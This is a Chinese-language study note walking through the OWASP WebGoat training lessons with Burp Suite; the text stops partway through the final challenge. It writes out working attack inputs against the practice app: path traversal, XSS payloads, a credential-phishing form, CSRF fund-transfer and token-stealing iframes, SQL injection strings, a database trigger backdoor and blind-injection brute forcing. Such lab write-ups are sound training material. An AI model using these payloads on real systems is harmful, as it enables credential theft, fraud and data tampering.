# Webgoat学习笔记

0x00 安装
=======

* * *

WebGoat的版本区别
------------

WebGoat是一个渗透破解的习题教程,分为简单版和开发版,[GitHub地址](https://github.com/WebGoat/WebGoat).

简单版安装
-----

简单版是个JAVA的Jar包,只需要有Java环境,然后在命令行里执行

```
java -jar webgoat-container-7.0.1-war-exec.jar

```

然后就可以访问"127.0.0.1:8080/WebGoat"就可以了,注意"WebGoat"大小写敏感,不能写错.

开发版安装
-----

WebGoat有些题目是开发版中才能做的,所以说需要安装开发版(但是比较坑的是安了开发版也有做不了的)先来看看条件

*   Java >= 1.6 ( JDK 1.7 recommended )
*   Maven > 2.0.9
*   Your favorite IDE, with Maven awareness: Netbeans/IntelliJ/Eclipse with m2e installed.
*   Git, or Git support in your IDE

Java环境肯定要装,然后因为我用的是Mac所以IDE用的是Xcode,Xcode自带了Git.所以剩下的就剩下Maven.

### Maven

用过Xcode的应该知道CocoaPods,Maven就是类似CocoaPods的一个包管理软件,[下载地址](http://maven.apache.org/download.cgi)中下载压缩包,不要下载源码

```
apache-maven-3.3.9-bin.zip

```

然后进行解压缩,之后进行Maven配置,其中x.x.x为版本号,Name为你Mac的账户名

1.  将解压后文件夹apache-maven-x.x.x移到/Users/Name/Library目录下
2.  然后修改`~/.bash_profile`的内容,如果不存在就新建一个

全部命令行为

```
cd ~/Downloads/
mv  apache-maven-3.3.9 ~/Library/apache-maven-3.3.9
vi ~/.bash_profile

```

其中bash_profile的内容为

```
export MAVEN_HOME=/Users/Name/Library/apache-maven-3.3.9
export PATH=$PATH:$MAVEN_HOME/bin

```

然后进行测试

```
mvn -version

```

看到以下内容就是成功了

```
Apache Maven 3.3.9 (bb52d8502b132ec0a5a3f4c09453c07478323dc5; 2015-11-11T00:41:47+08:00)
Maven home: /Users/Name/Library/apache-maven-3.3.9
Java version: 1.7.0_80, vendor: Oracle Corporation
Java home: /Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre
Default locale: zh_CN, platform encoding: UTF-8
OS name: "mac os x", version: "10.11.3", arch: "x86_64", family: "mac"

```

### WebGoat-Development

在环境安装完毕之后新建一个文件夹WebGoat-Workspace执行sh脚本自动下载和编译

```
mkdir WebGoat-Workspace
cd WebGoat-Workspace
curl -o webgoat_developer_bootstrap.sh https://raw.githubusercontent.com/WebGoat/WebGoat/master/webgoat_developer_bootstrap.sh
sh webgoat_developer_bootstrap.sh

```

### 编译提示Exit

有时候可能会碰见类似这样的Debug提示

```
2016-03-08 14:33:20,496 DEBUG - Exit: AxisEngine::init
2016-03-08 14:33:20,496 DEBUG - Exit: DefaultAxisServerFactory::getServer
2016-03-08 14:33:20,496 DEBUG - Exit: getEngine()

```

产生的原因是WebGoat-Lessons的课程配置不对,打开/WebGoat-Lessons/pom.xml大概在100多行找到以下这个,把**7.1-SNAPSHOT**改成正确的版本号,再次运行sh脚本就可以了

```
<dependency>
    <groupId>org.owasp.webgoat</groupId>
    <artifactId>webgoat-container</artifactId>
    <version>7.1-SNAPSHOT</version>
    <type>jar</type>
    <scope>provided</scope>
</dependency>

```

Chrome和BurpSuite
----------------

使用Chrome主要是其插件比较多,平时上网我都是用Safari的,下载一个插件"Proxy SwitchyOmega",可以设置仅有Chrome走代理,然后将代理指向BurpSuite的端口和地址,[BrupSuite使用看这里](http://alanli7991.github.io/2016/03/05/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%B7%A5%E5%85%B7%E5%87%86%E5%A4%87%E5%92%8C%E5%A1%AB%E5%9D%91/).

0x01 开始
=======

* * *

WebGoat的大坑
----------

由于WebGoat不同的版本课程都不一样,所以说网上的资料也不全,我用的是7.1.0版本,先来上个图

![Figure01](http://drops.javaweb.org/uploads/images/a284e33de9cfd320dcf42bcab7279a7d19669046.jpg)

而且**!!!最坑的是!!!**有些题根本他娘的没答案,或者答案是错的,开发版的题也不知道怎么做!

Introduction
------------

这一章节教了你怎么用这个东西,以及怎么为这个组织贡献课程,主要就是3个选项,没什么实质教学内容

*   Java Source: 源码
*   Solution: 答案
*   Hints: 提示

General-Http Basics
-------------------

这一章节让你明白什么是Http,可以用BurpSuite拦截一下报文和[我Blog中讲的基础](http://alanli7991.github.io/2016/03/02/Web%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%80%BB%E7%BB%93/)进行验证下,Solution使用的拦截工具是WebScarab,单独安装比较难,可以在Kali中使用,但是我用的是BurpSuite,效果一样.

Access Control Flaws-Using an Access Control Matrix
---------------------------------------------------

这个就是让你初步理解权限的概念,点一点,找到谁的权限最大就可以了

Access Control Flaws-Bypass a Path Based Access Control Scheme
--------------------------------------------------------------

这一节是让你利用拦截工具,改变参数,访问到原本不能访问的路径,在BurpSuite的Intercept里抓到这个请求

![Figure02](http://drops.javaweb.org/uploads/images/35c62823de0c27c460369eb2b10de03b6022f416.jpg)

然后根据Hints提醒使用shell脚本里切换到上一级目录的指令".."修改File的值"CSRF.html"构造出另外一个指令

```
 ../../../../../WEB-INF/spring-security.xml

```

就可以访问到目标目录意外的文件,但是坑爹的是不论试验了多少次都提示我

```
* Access to file/directory " ../../../../../WEB-INF/spring-security.xml" denied

```

然后看Solution里说是访问**main.jsp**于是改为

```
 ../../../../../main.jsp

```

课程通过...Hints和Solution根本不一样...这就是WebGoat的坑爹之处

Access Control Flaws-LAB: Role Based Access Control
---------------------------------------------------

### Stage 1: Bypass Business Layer Access Control

权限管理问题,由于代码没有对Control里的Delete指令做权限管理,又通过action字段判断Control指令,所以原本不应该有Delete权限的Tom执行了Delete操作.

1.  使用密码jerry进入Jerry Mouse的帐号,有ViewProfile和DeleteProfile的操作
2.  使用密码tom进入Tom Cat的帐号,只有ViewProfile
3.  执行ViewProfile拦截请求,改action为DeleteProfile

### Stage2

说是需要在开发版下修复这个问题,没找到怎么修复.

### Stage 3: Bypass Data Layer Access Control

水平越权问题,View这个操作不能像Delete一样对Tom进行权限上的控制,那么与Tom出于同一层级的其它用户也具有这个权限,所以说Tom可以通过拦截修改**employee_id**水平的访问其它人的资料,也是属于非正常逻辑.

### Stage4

需要对每一个操作再次进行权限核实,才能解决这个问题,也是要求在开发版下完成这节课,但是我也不知道怎么完成.

AJAX Security-LAB: Client Side Filtering
----------------------------------------

客户端过滤,有些时候服务器返回的了很多条信息,只挑选了其中少数进行显示,可以在返回的html源码中看到全部的信息.

1.  选中名字附近元素点击"检查"
2.  在源码中搜索关键词"hidden" "Joanne"等
3.  发现有3个"Joanne",其中一个隐藏了Neville的信息

AJAX Security-DOM Injection
---------------------------

DOM:文档对象模型(Document Object Model),是W3C组织推荐的处理可扩展标志语言的标准编程接口.就是HTML报文中的节点,这里说是通过DOM注入的方式让原本网页中不可点击的按钮变为可点击.

1.  输入License Key会自动发起一个Ajax的请求
2.  通过拦截AJAX请求的返回报文,把报文头和内容全部清空
3.  更改返回为一段JS代码

如下

```
 document.form.SUBMIT.disabled = false

```

此时按钮就可以使用了,除了这个方法之外,还可以直接检查按钮

```
<input disabled="" id="SUBMIT" value="Activate!" name="SUBMIT" type="SUBMIT">

```

改disabled为false或者直接删除这个标记.

AJAX Security-LAB: DOM-Based cross-site scripting
-------------------------------------------------

这就是一个简单的反射型XSS的演示,依次输入以下内容在文本框里

```
World//正常
<IMG SRC="images/logos/owasp.jpg"/>//XSS插入图片
<img src=x onerror=;;alert('XSS') />//XSS插入Alert
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>//XSS插入iFrame

```

甚至可以直接伪造界面

```
Please enter your password:
<BR><input type = "password" name="pass"/>
<button onClick="javascript:alert('I have your password: ' + pass.value);">Submit</button>
<BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>

```

AJAX Security-XML Injection
---------------------------

XML注入攻击,和HTML注入攻击一样,都是利用文本解析机制,写入恶意输入

1.  输入ID:836239,拦截请求
2.  修改返回报文的XML文件,给自己跟多的选择

返回报文

```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Cache-Control: no-cache
Content-Type: text/xml
Date: Tue, 08 Mar 2016 08:46:40 GMT
Content-Length: 136

<root>
<reward>WebGoat Mug 20 Pts</reward>
<reward>WebGoat t-shirt 50 Pts</reward>
<reward>WebGoat Secure Kettle 30 Pts</reward>
</root>

```

可以修改内容为

```
<root>
<reward>WebGoat Mug 20 Pts</reward>
<reward>WebGoat t-shirt 50 Pts</reward>
<reward>WebGoat Secure Kettle 30 Pts</reward>
<reward>WebGoat Secure Kettle 30 Pts</reward>
<reward>WebGoat Core Duo Laptop 2000 Pts</reward>
<reward>WebGoat Hawaii Cruise 3000 Pts</reward>
</root>

```

AJAX Security-JSON Injection
----------------------------

JSON注入攻击,原理和XML注入攻击一样

1.  From输入BOS,to输入SEA
2.  拦截请求返回报文

如下

```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Cache-Control: no-cache
Content-Type: text/html
Date: Tue, 08 Mar 2016 08:50:24 GMT
Content-Length: 169

{
"From": "Boston",
"To": "Seattle", 
"flights": [
{"stops": "0", "transit" : "N/A", "price": "$600"},
{"stops": "2", "transit" : "Newark,Chicago", "price": "$300"} 
]
}

```

修改600美元为30美元就可以便宜了

AJAX Security-Insecure Client Storage
-------------------------------------

这是最坑的一道题!!!

先来说下题目的原意,题目中让你找出优惠券号码,然后享受优惠,利用情形是

1.  有的优惠券号码是由服务器发送到前端的
2.  为了防止从源码窃取,发送到浏览器的是加密后的优惠码,用一定算法进行解密
3.  然后对比解密后的优惠券和用户的输入
4.  相同就享受优惠

这里有个逻辑漏洞,就是拿解密后的优惠码明文和用户输入进行对比,而不是**加密用户的输入与密文对比**,所以前端还是可以通过JS打断点获取到优惠码明文.

### 大坑来了

如果相对JS打断点,首先要能在控制台找到JS脚本文件,由于整个页面是使用了JQuery内嵌了课程内容(网页内部嵌另外一个网页),红色框内的内容是动态加载的,所以直接在Sources页面根本找不到内嵌网页的"clientSideValidation.js"

这个坑了我好久啊,对前端不熟悉怎么都找不到.js文件

![Figure03](http://drops.javaweb.org/uploads/images/a4e2a097142845a8e3f4e3b082484213e3219d5a.jpg)

Solution里给的答案第一步就是让你定位"clientSideValidation.js",**定位不到怎么办!!!!**

### 检查Network

既然内部的网页是动态加载的,那么肯定有网络通讯,可以通过检查Network看记录,和"clientSideValidation.js"附近的文件有个条网络请求"attack?Screen=272&menu=400"的,点击可以看到红色框体内的页面,然后可以获取到实际地址

```
http://zhuojiademacbook-pro.local:8080/WebGoat/attack?Screen=272&menu=400

```

### 利用Request拦截

除去查看Network之外,还可以利用BurpSuite拦截Ajax请求,因为整个页面是通过Ajax刷新的,Ajax本身又是一种请求,那么只要我点击purchase,就可以拦截到一条Request请求,且能看到页面内的相关参数

1.  对这个请求点击Action-Send to repeater
2.  右键-Show response in browser
3.  从浏览器里打开链接(注意此时关闭拦截)
4.  就跳转到了实际内部页面的地址

得到了实际地址后,就可以在子页面内调试JS

### Stage2

第二步说的是有些在前端可以通过删除掉input框的readonly标记任意修改金额,比较简单

AJAX Security-Dangerous Use of Eval
-----------------------------------

Eval是php语言中执行一段JS代码的意思,这一道题也是一种典型的反射型XSS展示,与刚刚基于DOM的不同,DOM是直接插入新节点,而这个是使用一定技巧,先关闭原本的DOM,然后写自己的DOM,再组装好刚刚被关闭DOM的后半部分.

通过php的Eval,alert被执行

```
123');alert(document.cookie);('

```

123后的

```
');

```

使得原本的DOM不受影响,最后的

```
('

```

闭合掉了原本多出的**')**符号

插入代码的样子是

```
('123');alert(document.cookie);('')

```

0X02 后续
=======

* * *

Authentication Flaws-Password Strength
--------------------------------------

介绍了不同复杂度的密码需要破解的时间,给的网站

```
https://howsecureismypassword.net

```

尼玛根本打不开,已经不存在了貌似,翻墙也没有

Authentication Flaws-Forgot Password
------------------------------------

题目的所有目的都是告诉你有些忘记密码的问题太简单,可以直接猜出来....尼玛...猜出来..猜出来..

1.  输入admin
2.  密码问你最喜欢的颜色
3.  颜色不就没几种么
4.  猜红黄绿三原色,然后green就猜中了

Authentication Flaws-Multi Level Login 1
----------------------------------------

这个题目坏掉了,题目的本意是第二步提交TAN#值的时候,有个叫hidden_tan的隐藏参数,来告知客户端哪个TAN值被用掉了,只需要修改这个值,就可以再次利用被使用过的TAN

可是我使用Jane和tarzan登录之后,第二次再登录不能用了...不知道是不是我理解错了.还是!!真的坏掉了!!

Authentication Flaws-Multi Level Login 2
----------------------------------------

两步验证的错误,意思是让你使用Joe和banana这个账户来登录Jane,因为第二步有个input的值叫hidden_user,在使用了Joe登录后,用户信息会被存在这个字段在第二步发送,所以只需要修改这个字段为Jane,就可以登录Jane

Buffer Overflows-Off-by-One Overflows
-------------------------------------

这一章节是为了介绍内存溢出带来的危害...但是题目感觉是为了出题而出题,并没有真实还原一个内存溢出造成的BUG

1.  第一步让你提交入住等级,姓名.房间号
2.  第二步让你选择入住时间
3.  选择成功会返回你的姓名和房间号

这里对第三个参数填充超级大的数据,比如大于4096位的字符串,就可能造成内存溢出漏洞,从而返回VIP客户的房间号和姓名

### 大坑来了

这个题目的想法是好的,目的在于输入框输入位数有限制,那么可以通过拦截报文,然后使用Intruder进行爆破,填充超级大的数据来造成内存溢出,但是,这里并没有真正还原了一个内存溢出错误,而是通过以下代码

```
// And finally the check...
       if(param3.length() > 4096)
       {
           ec.addElement(new Input(Input.hidden, "d", "Johnathan"));
           ec.addElement("\r\n");
           ec.addElement(new Input(Input.hidden, "e", "Ravern"));
           ec.addElement("\r\n");
           ec.addElement(new Input(Input.hidden, "f", "4321"));
           ec.addElement("\r\n");

           ec.addElement(new Input(Input.hidden, "g", "John"));
           ec.addElement("\r\n");
           ec.addElement(new Input(Input.hidden, "h", "Smith"));
           ec.addElement("\r\n");
           ec.addElement(new Input(Input.hidden, "i", "56"));
           ec.addElement("\r\n");

           ec.addElement(new Input(Input.hidden, "j", "Ana"));
           ec.addElement("\r\n");
           ec.addElement(new Input(Input.hidden, "k", "Arneta"));
           ec.addElement("\r\n");
           ec.addElement(new Input(Input.hidden, "l", "78"));
           ec.addElement("\r\n");

           ec.addElement(new Input(Input.hidden, "m", "Lewis"));
           ec.addElement("\r\n");
           ec.addElement(new Input(Input.hidden, "n", "Hamilton"));
           ec.addElement("\r\n");
           ec.addElement(new Input(Input.hidden, "o", "9901"));
           ec.addElement("\r\n");

           s.setMessage("To complete the lesson, restart lesson and enter VIP first/last name");

       }

```

仅仅是检查了第三个参数的长度,来增加返回报文,伪造了一个看似内存溢出的漏洞,十分坑爹....所以我还是不知道到底内存溢出漏洞咋产生的...

### 如何使用intruder爆破

我们要爆破的是第二个界面点击"Accept Terms"的链接,拦截下之后点击"Action-Send to intruder"

1.  选择Sniper模式
2.  点击Clear清除所有爆破点,然后选中114这个房间号码,点击Add设置为爆破点
3.  进入Payloads标签页
4.  选择用Character Blocks(字符串块)填充
5.  基础字符串是A,选择最短位数4096最长位数10240,步长50

![Figure01](http://drops.javaweb.org/uploads/images/3351486251f0c626aa7aa3e960ef13908703a61c.jpg)

![Figure02](http://drops.javaweb.org/uploads/images/1d38ef5f3609846d9e7aa7eafc39659f5285d0ea.jpg)

这个Character Blocks是什么意思呢?就是代表用4096位的A开始然后50位50位的依次加长长度,直到达到10240位,然后点击Start Attack,查看大于4096位之后的结果,就可以看到模拟出的内存泄漏信息

![Figure03](http://drops.javaweb.org/uploads/images/1c8eb558690bf3e48a7018d88b70954487fa185e.jpg)

Code Quality-Discover Clues in the HTML
---------------------------------------

这一篇主要在讲,没事不要他娘的乱写备注...比如这个作者把管理员用户名密码写备注里了

```
<!-- FIXME admin:adminpw  -->
<!-- Use Admin to regenerate database  -->

```

Concurrency-Thread Safety Problems
----------------------------------

线程安全问题,有些程序员写代码的时候喜欢各种用Static/Const之类的,觉得自己对内存了如指掌,吊的不知道哪里去了.但是往往忽略了多线程的问题,比如这个问题的源码

```
private static String currentUser;
private String originalUser;

```

这里currentUser使用了static静态变量,又没有做线程保护,就会造成浏览器Tab1访问这个页面时,Tab2同时访问,数据就会被替换掉

Concurrency-Shopping Cart Concurrency Flaw
------------------------------------------

如上题一样,也是由于使用了静态变量却没有做线程保护,导致的购物车多线程支付问题.

0x03 XSS
========

* * *

Cross-Site Scripting (XSS)-Phishing with XSS
--------------------------------------------

简单的反射型XSS钓鱼演示

```
</form>
  <script>
    function hack(){ 
    XSSImage=new Image;
    XSSImage.src="http://localhost:8080/WebGoat/catcher?PROPERTY=yes&user=" + document.phish.user.value + "&password=" + document.phish.pass.value + "";
    alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + " Password = " + document.phish.pass.value);
} 
  </script>
<form name="phish">
<br>
<br>
<HR>
  <H2>This feature requires account login:</H2>
<br>
  <br>Enter Username:<br>
  <input type="text" name="user">
  <br>Enter Password:<br>
  <input type="password" name = "pass">
<br>
  <input type="submit" name="login" value="login" onclick="hack()">
</form>
<br>
<br>
<HR>

```

将上边的代码输入到文本框,XSS会造成一个钓鱼的登录界面,用来骗取登录账户和密码

Cross-Site Scripting (XSS)-LAB: Cross Site Scripting
----------------------------------------------------

这是一篇系统的XSS介绍

### Stage1-4

这四个步骤介绍了储存型XSS,主要步骤如下

1.  Tom的档案是可以编辑的,Jerry作为人力可以查看Tom的档案
2.  Tom对自己的档案进行编辑,放入XSS代码,被储存到数据库
3.  Jerry查看Tom档案时,咣当..中招了

然后Stage2和4给出了两种方法修复XSS

第一是对输入进行检查,进行编码,第二个是对输出进行编码,分为JS Encode和HTML Encode,整个1-4由于没有Soluition,而且貌似XSS已经是被修复后的状态,所以没法完成...感觉这节课也是坏掉的...

### Stage5-6

这里是反射型XSS的教程,说是在SearchStaff有个反射型的XSS,可以通过输入那里注入代码,但是没能复现,可能也是坏掉了...Stage6必须在开发模式下,也不知道怎么做.

Cross-Site Scripting (XSS)-Stored XSS Attacks
---------------------------------------------

讲述了一种最典型的储存型XSS的例子---||||-留言板.

1.  留言板可以输入任何信息
2.  没有进行输入输出编码,产生了XSS
3.  用户A进行恶意留言
4.  用户B点进来自动显示用户A的留言,中XSS

Cross-Site Scripting (XSS)-Reflected XSS Attacks
------------------------------------------------

典型的反射型XSS掩饰,Enter your three digit access code:输入框有反射型XSS漏洞

Cross-Site Scripting (XSS)-Cross Site Request Forgery (CSRF)
------------------------------------------------------------

这里是一个储存型XSS和CSRF结合的示例,CSRF就是冒名登录,用代码伪造请求,[详细看这里](http://alanli7991.github.io/2016/03/02/Web%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%80%BB%E7%BB%93/),这里是吧CSRF恶意代码利用储存型XSS放到了网页上,通过留言Message里输入

```
<iframe src="attack?Screen=284&amp;menu=900&amp;transferFunds=5000"></iframe>

```

就可以看到储存型XSS会出发出一个转账页面,如果想这个页面被被害者发现

```
<iframe src="attack?Screen=284&amp;menu=900&amp;transferFunds=5000" width="1" height="1"></iframe>

```

通过宽高设置成1像素,隐藏掉这个页面

Cross-Site Scripting (XSS)-CSRF Prompt By-Pass
----------------------------------------------

这个就是利用CSRF进行冒名操作转账,留下恶意代码如下

```
<iframe
    src="attack?Screen=282&menu=900&transferFunds=5000"
    id="myFrame" frameborder="1" marginwidth="0"
    marginheight="0" width="800" scrolling=yes height="300"
    onload="document.getElementById('frame2').src='attack?Screen=282&menu=900&transferFunds=CONFIRM';">
</iframe>

<iframe
    id="frame2" frameborder="1" marginwidth="0"
    marginheight="0" width="800" scrolling=yes height="300">
</iframe>

```

1.  第一个iframe是进行转账5000
2.  当第二个加载完毕,去获取第二个iframe执行转账确认按键
3.  然后再下边事先构造好"id=frame2"的第二个iframe

根据刚刚的文章讲,预防CSRF的一个有效手段就是Token,但是Token在管理不严的情况下也是可以被窃取的

Cross-Site Scripting (XSS)-
---------------------------

演示窃取Token后的CSRF

```
<script>
var tokensuffix;

function readFrame1()
{
    var frameDoc = document.getElementById("frame1").contentDocument;
    var form = frameDoc.getElementsByTagName("form")[0];
    tokensuffix = '&CSRFToken=' + form.CSRFToken.value;

    loadFrame2();
}

function loadFrame2()
{
    var testFrame = document.getElementById("frame2");
    testFrame.src="attack?Screen=278&menu=900&transferFunds=5000" + tokensuffix;
}
</script>

<iframe src="attack?Screen=278&menu=900&transferFunds=main"
    onload="readFrame1();"
    id="frame1" frameborder="1" marginwidth="0"
    marginheight="0" width="800" scrolling=yes height="300"></iframe>

<iframe id="frame2" frameborder="1" marginwidth="0"
    marginheight="0" width="800" scrolling=yes height="300"></iframe>

```

1.  先加载main页面窃取Token
2.  然后加载转账页面发送CSRF转账请求

Cross-Site Scripting (XSS)-HTTPOnly Test
----------------------------------------

这里就是测试HTTPOnly在对第三方Cookie的管理的影响,被标记了HTTPOnly的Cookie不能被JS获取到.所以一般Session和Token最好放在带有标记的Cookie里

但是这里有个疑问,如果用户选择不同的DOM就可以打开关闭HTTPOnly的标记,是不是可以诱导用户先关掉呢...还是说这里也是为了出题而出题,只是伪造了HTTPOnly的效果

Improper Error Handling-Fail Open Authentication Scheme
-------------------------------------------------------

这一个章节主要是讲要对错误有处理,不然错误处理的不全面也可能造成漏洞,比如这里

1.  输入webgoat帐号
2.  然后输入任意密码
3.  拦截Request报文
4.  删掉密码这一个参数

这样也能登录成功,所以说明代码对获取不到密码这个参数时的错误处理不充分

0x04 Injection
==============

* * *

Injection Flaws-
----------------

整个一章都在讲注入,由于注入的手段基本类似,主要是两点

1.  提前闭合正常代码,输入恶意代码
2.  处理由于闭合正常代码留下的尾巴

Injection Flaws-Command Injection
---------------------------------

这个的意思是进行命令行注入,因为有些操作后台都是通过命令行完成的,所以可以尝试输入Shell指令来进行注入,但是它喵的我按照它说的来怎么都完成不了......

Injection Flaws-Numeric SQL Injection
-------------------------------------

数字SQL注入,这里说的一个SQL语句

```
SELECT * FROM weather_data WHERE station = [station]

```

可以拦截报文将station字段后补充

```
101 OR 1=1

```

整个语句就变成了

```
SELECT * FROM weather_data WHERE station = 101 OR 1=1

```

由于1=1恒成立,所以会遍历出所有的数据库表单

Injection Flaws-Log Spoofing
----------------------------

日志伪造,这里是攻击者发现了日志生成的规则,通过注入恶意字符串,按照规则伪造出一条日志,在Username输入

```
Smith%0d%0aLogin Succeeded for username: admin

```

其中%0d和%0a为CRLF换行符,看到的输出为

```
Login failed for username: Smith
Login Succeeded for username: admin

```

其实第二行完全是伪造出来的

Injection Flaws-String SQL Injection
------------------------------------

字符串注入,由于字符串是由''包裹起来的,所以要注意格式,和数字注入原理一样

```
Erwin' OR '1'='1

```

SQL拼接出来的结果是

```
SELECT * FROM user_data WHERE last_name = 'Erwin' OR '1'='1'

```

Injection Flaws-LAB: SQL Injection
----------------------------------

### Stage1-4

其实还是展现了数字和字符串不同的注入方法,对password进行拦截,然后使用字符串注入,可以登录任意账户.

剩下的我并没有做出来,也没有Solution,感觉题目坏掉了..

Injection Flaws-Database Backdoors
----------------------------------

利用SQL输入插入后门,首先是一个SQL注入点,可以通过数字注入看到所有人的薪水,然后使用以下SQL指令可以修改薪水

```
101; update employee set salary=10000

```

更加高级的是插入后门,下边这个后门好象是创建新用户的时候会自动修改邮箱为你的邮箱

```
CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='john@hackme.com'WHERE userid = NEW.userid

```

Injection Flaws-Blind Numeric SQL Injection
-------------------------------------------

数字盲注,有些时候存在SQL注入,但是获取不到我们需要的信息,此时可以通过SQL语句的条件判断,进行盲注.

比如我们知道一个cc_number=1111222233334444,但是想知道其pin在pins table里的值,可以使用盲注进行爆破,输入

```
101 AND ((SELECT pin FROM pins WHERE cc_number='1111222233334444') > 10000 );

```

对10000进行1-10000步长为1的爆破,可以发现返回报文的长度在2364和2365改变了...尝试用=2364进行请求,返回成功.那么其pin就为2364

Injection Flaws-Blind String SQL Injection
------------------------------------------

字符串盲注,猜测`cc_number='4321432143214321'`的用户名,使用了SQL里的SUBSTRING这个函数,每一个字母进行爆破,原理和数字盲注一样,但是这里爆破有一点小技巧

```
101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 1, 1) = 'h' );

```

### 爆破技巧

这里有两个爆破点,一个是SubString的第二个参数,一个是字母h,所以使用Cluster Bomb进行爆破

1.  爆破点1 是1-10 10个可能性
2.  爆破点2 是a-z和A-Z 52个可能性

那么一共就是520次可能性,Intruder的设置如下

![Figure01](http://drops.javaweb.org/uploads/images/9567e6939273c0c7286a43de52b3660c2263860c.jpg)![Figure02](http://drops.javaweb.org/uploads/images/2a66b0eb233f0d12886c8491c8d80b6785b7d1b9.jpg)![Figure03](http://drops.javaweb.org/uploads/images/725108f1cb160764e38cd1d8708277ecc7d5511a.jpg)

可以看到报文有两种结果1333 1334,其中第一个爆破点为10的都是1334,而有一些不是,查看返回报文发现有两种

```
Invalid account number
Account number is valid

```

![Figure04](http://drops.javaweb.org/uploads/images/a89dde1813dad940af6dfd3ef930a6794bac0ab9.jpg)![Figure04](http://drops.javaweb.org/uploads/images/49cb64bd4552000e81505cc42fa1fd2d392d0fb8.jpg)

爆破点1=10返回报文为1334是因为10比1-9多一位,那么对正确的报文进行搜索Fliter,得到结果

![Figure04](http://drops.javaweb.org/uploads/images/167ae5743e2eb0f479b008501ad95c68c3fda649.jpg)

用户名爆破成功

0x05 进阶
=======

Denial of Service-ZipBomb
-------------------------

意思是突破2MB文件限制上传20MB的以上的东西,感觉应该是拦截某些Request,然后修改一些参数.

但是我拦截的Request的file字段都是[object file]不管传什么都没响应..感觉是坏掉了这道题

Denial of Service-Denial of Service from Multiple Logins
--------------------------------------------------------

解释了一下DDOS攻击的原理...就是访问的人太多了,多登录几次就好了

Insecure Communication-Insecure Login
-------------------------------------

介绍了HTTP报文和HTTPS报文的区别,题目原意是让你

1.  拦截HTTP报文看到密码
2.  然后进入回答密码是多少
3.  切换到HTTPS看看还能不能看到报文

但是切换到HTTPS之后,打不开网页,可能是WebGoat没有提供HTTPS的服务吧....题目坏掉了又

Insecure Storage-Encoding Basics
--------------------------------

讲了常见的编码基础,以及是否可以被解密,需要注意的是BASE64不是加密,而是一种编码,虽然英文都是Encode

Malicious Execution-Malicious File Execution
--------------------------------------------

题目的目的是

1.  前端会对上传的文件做本地检查
2.  先上传满足检查的文件
3.  拦截报文,修改成另外一个可执行文件如JSP
4.  如果服务端没有检查,就能被执行

但是貌似题目坏掉了..别说恶意文件...正常图片都上传不了

Parameter Tampering-Bypass HTML Field Restrictions
--------------------------------------------------

修改页面的HTML文本解除一些前端的限制,如按钮是否可用

Parameter Tampering-Exploit Hidden Fields
-----------------------------------------

查看HTML文本找到一些被打了Hidden标记的元素

Parameter Tampering-Exploit Unchecked Email
-------------------------------------------

找到被Hidden的Email或者通过拦截修改发送Email的地址

Parameter Tampering-Bypass Client Side JavaScript Validation
------------------------------------------------------------

修改存在页面上的JS文件使得前端的正则校验失效,从而给服务端发超出限制的字符

Session Management Flaws-Hijack a Session(有疑问)
----------------------------------------------

Session劫持,题目的本意是让你在两次登录生成不同的Session之间,估算哪个Session已经被人使用了,然后进行爆破....但是我没有做出来,BurpSuite没有找到对应的Session Analyze的地方.

Session Management Flaws-Session Fixation
-----------------------------------------

Session串改,题目的意思如下

1.  你伪造一个带有Session的链接发送给别人,在邮件内容后加&SID=WHAT
2.  别人用你的链接进行了登录,使用账户密码Jane/tarzan
3.  点击下一步发现&SID=NOVALIDSESSION
4.  此时你只需要用刚刚发送的Session值,就可以直接进入别人账户

原Session链接

```
WebGoat/start.mvc#attack/311/1800&SID=NOVALIDSESSION

```

修改为Seesion链接

```
WebGoat/start.mvc#attack/311/1800&SID=WHAT

```

进入Jane账户成功

Web Services-Create a SOAP Request&WSDL Scanning
------------------------------------------------

简单介绍了什么是SOAP和WSDL,但是它提供的?WSDL我没有看到WSDL而是看到了一堆Error

具体学习[Web Services的文章可以看这里](http://alanli7991.github.io/2016/03/03/WebSerivce%E7%9A%84%E5%AD%A6%E4%B9%A0/)

Web Services-Web Service SQL Injection&Web Service SAX Injection
----------------------------------------------------------------

利用Web Services进入SQL注入和SOAP报文注入,原理和其它注入攻击一样,由于WebGoat的Web Service服务有问题...也没有完成

Admin Functions-Report Card
---------------------------

学习记录卡...没什么用

0x06 Challenge
==============

* * *

Challenge
---------

大结局,先来吐槽一下,这个Challenge如果能不看答案做出来...我觉得就已经不是初学者了,总会出现各种开挂的步骤,或者说为了出题而出题,思路对了但是不选特定的选项就不会出结果....

先来列举下这里用到了哪些知识

1.  HTML源码审计
2.  BASE64编码
3.  SQL注入
4.  命令行注入

其中每一个知识点用于

1.  用于发现管理员帐号和密码
2.  用来解析Cookie
3.  用来对Cookie进行注入获取信用卡
4.  用于查询js文件路径,和篡改网页

### Stage1

越权登录一般有两种方法

1.  获取到管理员帐号
2.  进行注入无效化密码

先对密码进行注入试一试

```
password' OR '1'='1

```

发现不行,然后分析HTTP报文

![Figure01](http://drops.javaweb.org/uploads/images/02727e5a4bb08dc1d138c0b26b745709cac4fd91.jpg)

发现输入可能可以注入的点有Username/Password/Submit/user/user(Cookie)这几个,用户名一般不能进行注入,密码又试验过了,还剩下user和user(Cookie)

发现Cookie中的User是个编码,先去看看是什么,通过尝试,发现Base64编解码发现Cookie中会存user参数

![Figure02](http://drops.javaweb.org/uploads/images/153fff782125e6b2b8864e3aaa1c1e2a13580a0f.jpg)

对两个都进行注入试试,先是user,然后把注入代码编码成Base64再放入user(Cookie)

```
youaretheweakestlink' OR '1'='1
eW91YXJldGhld2Vha2VzdGxpbmsnIE9SICcxJz0nMQ==

```

发现都不行,还是登录不进去,真是坑了大爹了...现在只好思考这个"youaretheweakestlink"是什么,所以去读HTML源码,发现了这一个

```
